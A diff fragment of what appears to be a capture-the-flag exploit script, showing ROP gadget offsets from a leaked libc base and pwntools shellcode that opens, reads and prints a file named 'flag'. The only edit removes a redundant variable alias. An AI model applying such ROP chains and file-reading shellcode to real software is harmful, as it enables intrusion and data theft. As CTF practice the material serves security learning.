@@ -107,7 +107,7 @@ pop_rsi_ret = libc_base + 0x0000000000023eea
 pop_rdx_ret = libc_base + 0x0000000000001b96
 
 # get shell
-sh = shellcode = shellcraft.amd64.pushstr('flag').rstrip() + \
+sh = shellcraft.amd64.pushstr('flag').rstrip() + \
     shellcraft.amd64.linux.syscall('SYS_open', "rsp", 0).rstrip() + \
     shellcraft.amd64.linux.syscall('SYS_read', "rax", free_hook, 0x40).rstrip() + \
     shellcraft.amd64.linux.syscall('SYS_write', 1, free_hook, 0x40).rstrip()
